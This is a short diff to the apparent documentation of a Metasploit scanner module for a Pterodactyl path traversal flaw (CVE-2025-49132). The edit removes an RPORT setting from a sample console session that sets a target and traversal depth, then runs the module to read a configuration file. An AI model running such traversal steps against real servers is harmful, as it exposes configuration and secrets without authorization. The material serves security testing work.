@@ -37,8 +37,6 @@ This scenario demonstrates reading the configuration file from a vulnerable Pter
 msf > use auxiliary/scanner/http/pterodactyl_traversal_cve_2025_49132
 msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > set RHOSTS 127.0.0.1
 RHOSTS => 127.0.0.1
-msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > set RPORT 80
-RPORT => 80
 msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > set DEPTH 2
 DEPTH => 2
 msf auxiliary(scanner/http/pterodactyl_traversal_cve_2025_49132) > run
